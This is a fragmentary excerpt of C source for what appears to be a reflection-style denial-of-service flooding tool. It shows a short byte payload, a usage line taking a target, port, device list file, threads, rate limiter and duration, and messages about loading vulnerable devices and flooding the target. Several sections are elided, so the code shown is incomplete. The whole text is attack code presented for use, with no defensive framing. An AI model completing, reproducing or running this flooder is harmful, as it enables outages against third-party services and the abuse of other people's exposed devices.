...
//would rather define for using puts
static const char PAYLOAD[] = "\x3c\xaa\x3e";
...
{
	if(argc < 6){
		fprintf(stdout, "%s [Target] [Port] [File] [Threads] [Limiter] [Time]\n", argv[0]);
		exit(-1);
	}
	srand(time(NULL));
	int i = 0;
	head = NULL;
	fprintf(stdout, "Loading Vulnerable Devices...\n");
	int max_len = 128;
...
fprintf(stdout, "Flooding Specified Target\n");
